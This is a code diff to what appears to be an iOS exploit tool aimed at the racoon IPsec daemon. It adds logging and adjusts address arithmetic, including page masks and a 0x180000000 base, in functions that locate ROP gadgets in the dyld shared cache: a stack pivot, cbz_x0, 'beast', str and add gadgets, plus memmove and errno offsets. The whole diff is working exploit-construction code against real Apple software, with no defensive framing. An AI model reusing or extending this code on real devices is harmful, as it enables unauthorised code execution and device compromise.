@@ -104,6 +104,7 @@ void * isakmp_cfg_config_addr() {
 				void * curr_inst = racoon_bin+((size_t)backwards_search);
 				if (is_adr(curr_inst)) {
 					uint64_t off = get_adr_off(curr_inst);
+					LOG("isakmp_cfg_config_addr: 0x%llx\n",off+backwards_search);
 					return off+backwards_search;
 				}
 			}
@@ -124,6 +125,7 @@ void * lcconf_addr() {
 				void * curr_inst = racoon_bin+((size_t)backwards_search);
 				if (is_ldr_lit(curr_inst)) {
 					uint64_t off = get_ldr_lit_off(curr_inst);
+					LOG("lcconf_addr: 0x%llx\n",off+backwards_search);
 					return off+backwards_search;
 				}
 			}
@@ -134,6 +136,7 @@ void * lcconf_addr() {
 
 size_t get_cache_maxslide() {
 	uint64_t * cache_slide = shared_cache + 30*8;
+	LOG("Cache maxslide: 0x%llx\n",*cache_slide);
 	return *cache_slide;
 }
 
@@ -154,14 +157,16 @@ void * memmove_cache_ptr(char * path) {
 			if (first) {first = false; continue;} // skip first bl
 			void * loader_stub = (void*)(get_bl_off(curr_instr) + (size_t)curr_instr);
 			if (!is_adrp(loader_stub)) {return NULL;} // should be there
-			void * memmove_ptr = (void*)(get_adr_off(loader_stub)+((size_t)curr_instr & ~0xfff));
+			void * memmove_ptr = (void*)(get_adr_off(loader_stub)+((size_t)curr_instr & ~0x3fff));
 			loader_stub += 4; // next instruction
 			if (!is_ldr_imm_uoff(loader_stub)) {return NULL;} // should be there
-			memmove_ptr += get_ldr_imm_uoff(loader_stub)-(size_t)shared_cache;
+			memmove_ptr += get_ldr_imm_uoff(loader_stub);
+			memmove_ptr -= (size_t) shared_cache;
+			memmove_ptr += 0x180000000;
+			LOG("memmove cache ptr: 0x%llx\n",memmove_ptr);
 			return memmove_ptr;
 		}
 	}
-
 	return NULL;
 }
 
@@ -176,7 +181,8 @@ void * get_stackpivot_addr(char * path) {
 	longjmp += (size_t)shared_cache;
 	for (void * curr_instr = longjmp; curr_instr < (longjmp+0x4000); curr_instr+=4) {
 		if (is_add_imm(curr_instr)) { // mov sp, x2 is acc add sp, x2, 0
-			return curr_instr-(size_t)shared_cache;
+			LOG("stackpivot: %llx\n",curr_instr-(size_t)shared_cache+0x180000000);
+			return curr_instr-(size_t)shared_cache+0x180000000;
 		}
 	}
 	return NULL;
@@ -190,20 +196,24 @@ void * get_cbz_x0_gadget() {
 			void * stub_instr = curr_instr+4+bl_off;
 			if (!is_adrp(stub_instr)) {continue;}
 			if (!is_ldr_imm_uoff(stub_instr+4)) {continue;}
-			return curr_instr-(size_t)shared_cache;
+			LOG("cbz_x0_gadget: %llx\n",curr_instr-(size_t)shared_cache+0x180000000);
+			return curr_instr-(size_t)shared_cache+0x180000000;
 		}
 	}
 	return NULL;
 }
 
 void * get_cbz_x0_x16_load(void * cbz_x0_gadget_addr) {
+	cbz_x0_gadget_addr -= 0x180000000;
 	cbz_x0_gadget_addr += (size_t)shared_cache;
 	if (is_cbz(cbz_x0_gadget_addr) && get_cbz_off(cbz_x0_gadget_addr) == 8 && is_ret(cbz_x0_gadget_addr+8) && is_b(cbz_x0_gadget_addr+4)) {
     	int64_t bl_off = get_bl_off(cbz_x0_gadget_addr+4);
     	void * stub_instr = cbz_x0_gadget_addr+4+bl_off;
     	if (!is_adrp(stub_instr)) {return NULL;}
     	if (!is_ldr_imm_uoff(stub_instr+4)) {return NULL;}
-		return (void*)((((size_t)stub_instr & ~0xfff)+get_adr_off(stub_instr)+get_ldr_imm_uoff(stub_instr+4)) - (size_t)shared_cache);
+		uint64_t found = (void*)((((size_t)stub_instr & ~0xfff)+get_adr_off(stub_instr)+get_ldr_imm_uoff(stub_instr+4)) - (size_t)shared_cache + 0x180000000);
+		LOG("cbz_x0_x16_load: 0x%llx\n",found);
+		return found;
     }
 	return NULL;
 }
@@ -223,7 +233,9 @@ void * get_errno_offset(char * path) {
 		if (is_bl(curr_instr)) {
 			void * errno_stub = curr_instr + get_bl_off(curr_instr);
 			if (!is_adrp(errno_stub)) {continue;}
-			return (void*)((((size_t)errno_stub & ~0xfff)+get_adr_off(errno_stub)) - (size_t)shared_cache);
+			uint64_t found = (void*)((((size_t)errno_stub & ~0x3fff)+get_adr_off(errno_stub)) - (size_t)shared_cache + 0x180000000);
+			LOG("errno offset: 0x%llx\n",found);
+			return found;
 		}
 	}
 	return NULL;
@@ -252,7 +264,8 @@ void * get_pivot_x21_gadget() {
 				 0x20,0x01,0x3f,0xd6     // blr x9
 				}),4*6,true);
 	if (!ret) return ret;
-	return ret-(size_t)shared_cache;
+	LOG("pivot x21: 0x%llx\n",ret+0x180000000);
+	return ret+0x180000000;
 }
 
 void * get_beast_gadget() {
@@ -277,7 +290,8 @@ void * get_beast_gadget() {
 		  0xc0,0x03,0x5f,0xd6   //   ret
 		}), 4*18,true);
 	if (!ret) return ret;
-	return ret-(size_t)shared_cache;
+	LOG("beast gadget: 0x%llx\n",ret+0x180000000);
+	return ret+0x180000000;
 }
 
 void * get_str_x0_gadget() {
@@ -289,7 +303,8 @@ void * get_str_x0_gadget() {
 		 0xc0,0x03,0x5f,0xd6     //   ret
 		}), 4*5, true);
 	if (!ret) return ret;
-	return ret-(size_t)shared_cache;
+	LOG("str x0 gadget: 0x%llx\n",ret+0x180000000);
+	return ret+0x180000000;
 }
 
 void * get_add_x0_gadget() {
@@ -301,7 +316,8 @@ void * get_add_x0_gadget() {
      0xc0,0x03,0x5f,0xd6     //   ret
 	}), 4*5,true);
 	if (!ret) return ret;
-	return ret-(size_t)shared_cache;
+	LOG("add x0 gadget: 0x%llx\n",ret+0x180000000);
+	return ret+0x180000000;
 }
 
 
